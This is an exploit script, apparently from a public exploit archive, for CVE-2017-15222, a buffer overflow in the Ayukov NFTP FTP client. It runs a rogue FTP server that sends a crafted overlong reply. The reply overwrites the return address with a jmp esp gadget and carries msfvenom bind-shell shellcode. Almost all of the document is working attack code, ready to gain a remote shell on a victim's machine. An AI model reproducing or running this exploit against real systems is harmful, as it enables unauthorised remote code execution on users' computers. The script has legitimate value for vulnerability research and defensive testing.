# Exploit Title: Ayukov NFTP FTP Client 2.0 - Buffer Overflow
# Date: 2018-12-29
# Exploit Author: Uday Mittal
# Vendor Homepage: http://www.ayukov.com/nftp/
# Software Link: ftp://ftp.ayukov.com/pub/src/nftp-1.72.zip 
# Version : below 2.0
# Tested on: Microsoft Windows XP SP3
# CVE: CVE-2017-15222

# EIP Location: 4116
# Buffer starts from : 4121
# 0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
# badchars: '\x00\x0A\x0D\x40'
# Shellcode: msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.21 LPORT=4444 -b '\x00\x0A\x0D' -f python

import socket

IP = '192.168.1.139'
port = 21

buf =  ""
buf += "\xb8\x21\x18\x62\xb1\xda\xd4\xd9\x74\x24\xf4\x5d\x29"
buf += "\xc9\xb1\x53\x31\x45\x12\x83\xed\xfc\x03\x64\x16\x80"
buf += "\x44\x9a\xce\xc6\xa7\x62\x0f\xa7\x2e\x87\x3e\xe7\x55"
buf += "\xcc\x11\xd7\x1e\x80\x9d\x9c\x73\x30\x15\xd0\x5b\x37"
buf += "\x9e\x5f\xba\x76\x1f\xf3\xfe\x19\xa3\x0e\xd3\xf9\x9a"
buf += "\xc0\x26\xf8\xdb\x3d\xca\xa8\xb4\x4a\x79\x5c\xb0\x07"
buf += "\x42\xd7\x8a\x86\xc2\x04\x5a\xa8\xe3\x9b\xd0\xf3\x23"
buf += "\x1a\x34\x88\x6d\x04\x59\xb5\x24\xbf\xa9\x41\xb7\x69"
buf += "\xe0\xaa\x14\x54\xcc\x58\x64\x91\xeb\x82\x13\xeb\x0f"
buf += "\x3e\x24\x28\x6d\xe4\xa1\xaa\xd5\x6f\x11\x16\xe7\xbc"
buf += "\xc4\xdd\xeb\x09\x82\xb9\xef\x8c\x47\xb2\x14\x04\x66"
buf += "\x14\x9d\x5e\x4d\xb0\xc5\x05\xec\xe1\xa3\xe8\x11\xf1"
buf += "\x0b\x54\xb4\x7a\xa1\x81\xc5\x21\xae\x66\xe4\xd9\x2e"
buf += "\xe1\x7f\xaa\x1c\xae\x2b\x24\x2d\x27\xf2\xb3\x52\x12"
buf += "\x42\x2b\xad\x9d\xb3\x62\x6a\xc9\xe3\x1c\x5b\x72\x68"
buf += "\xdc\x64\xa7\x05\xd4\xc3\x18\x38\x19\xb3\xc8\xfc\xb1"
buf += "\x5c\x03\xf3\xee\x7d\x2c\xd9\x87\x16\xd1\xe2\xb6\xba"
buf += "\x5c\x04\xd2\x52\x09\x9e\x4a\x91\x6e\x17\xed\xea\x44"
buf += "\x0f\x99\xa3\x8e\x88\xa6\x33\x85\xbe\x30\xb8\xca\x7a"
buf += "\x21\xbf\xc6\x2a\x36\x28\x9c\xba\x75\xc8\xa1\x96\xed"
buf += "\x69\x33\x7d\xed\xe4\x28\x2a\xba\xa1\x9f\x23\x2e\x5c"
buf += "\xb9\x9d\x4c\x9d\x5f\xe5\xd4\x7a\x9c\xe8\xd5\x0f\x98"
buf += "\xce\xc5\xc9\x21\x4b\xb1\x85\x77\x05\x6f\x60\x2e\xe7"
buf += "\xd9\x3a\x9d\xa1\x8d\xbb\xed\x71\xcb\xc3\x3b\x04\x33"
buf += "\x75\x92\x51\x4c\xba\x72\x56\x35\xa6\xe2\x99\xec\x62"
buf += "\x12\xd0\xac\xc3\xbb\xbd\x25\x56\xa6\x3d\x90\x95\xdf"
buf += "\xbd\x10\x66\x24\xdd\x51\x63\x60\x59\x8a\x19\xf9\x0c"
buf += "\xac\x8e\xfa\x04"

evil = "A"*4116 + "\x10\xb3\x45\x7e" + "\x90"*100 +  buf + "D"*10425

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((IP, port))
        s.listen(20)
        print("[i] FTP Server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome!' + '\r\n')
    print conn.recv(1024)
    conn.send('331 OK.\r\n')
    print conn.recv(1024)
    conn.send('230 OK.\r\n')
    print conn.recv(1024)
    conn.send(evil + '\r\n')
    print conn.recv(1024)
    conn.send('257' + '\r\n')